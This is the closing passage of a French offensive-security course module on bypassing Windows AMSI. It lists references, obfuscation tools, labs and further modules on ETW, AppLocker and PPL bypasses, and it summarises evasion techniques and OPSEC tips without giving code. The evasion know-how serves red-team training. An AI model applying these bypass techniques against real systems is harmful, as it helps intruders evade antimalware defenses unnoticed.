- [AMSI API Reference](https://docs.microsoft.com/en-us/windows/win32/api/amsi/)

### Articles techniques

- [AMSI Bypass Methods](https://www.contextis.com/en/blog/amsi-bypass)
- [Red Team Notes: AMSI](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- [Offensive Security: AMSI](https://www.offensive-security.com/metasploit-unleashed/amsi-bypass/)

### Outils

- **AMSITrigger** : Identifie les parties de code déclenchant AMSI
- **PowerShell Obfuscator** : Obfusquer du code PowerShell
- **Invoke-Obfuscation** : Framework d'obfuscation PowerShell

### Labs pratiques

- TryHackMe : "Windows Red Teaming"
- HackTheBox : "Active Directory Labs"
- PentesterLab : "Windows Exploitation"

---

## 11. Points clés à retenir

1. **AMSI est une couche de défense, pas une solution miracle**
   - Il peut être bypassé, mais cela génère des IOC
   - Les EDR modernes détectent les bypass AMSI connus

2. **Plusieurs techniques de bypass existent**
   - Memory patching (AmsiScanBuffer)
   - Context corruption (AmsiContext)
   - DLL unloading
   - Obfuscation

3. **L'OPSEC est cruciale**
   - Minimiser le temps de bypass
   - Restaurer après usage
   - Obfusquer les signatures connues
   - Utiliser des syscalls directs

4. **AMSI n'est qu'une partie de la défense Windows**
   - Il faut aussi contourner : ETW, ScriptBlock Logging, Constrained Language Mode
   - Une approche holistique est nécessaire en Red Team

5. **La détection évolue constamment**
   - Les techniques de bypass d'aujourd'hui sont les signatures de demain
   - Rester à jour avec les nouvelles recherches

---

## 12. Prochaines étapes

Après avoir maîtrisé AMSI Bypass, vous devriez étudier :

- **Module W37** : ETW (Event Tracing for Windows) Bypass
- **Module W38** : Constrained Language Mode Bypass
- **Module W39** : Applocker / WDAC Bypass
- **Module W40** : Protected Process Light (PPL) Bypass

**Progression recommandée** :
```
W36 (AMSI) → W37 (ETW) → W38 (CLM) → W39 (Applocker)
```

Ces modules sont complémentaires pour une évasion complète sur Windows moderne.

---

**AVERTISSEMENT LÉGAL** : Les techniques présentées dans ce cours sont destinées à un usage éducatif et de cybersécurité défensive uniquement. L'utilisation de ces techniques sans autorisation explicite est illégale. Les auteurs et instructeurs déclinent toute responsabilité pour toute utilisation abusive de ces informations.

---

**Version** : 1.0
**Dernière mise à jour** : 2025-12-07
**Auteur** : C-Full-Offensive-Course - Module W36
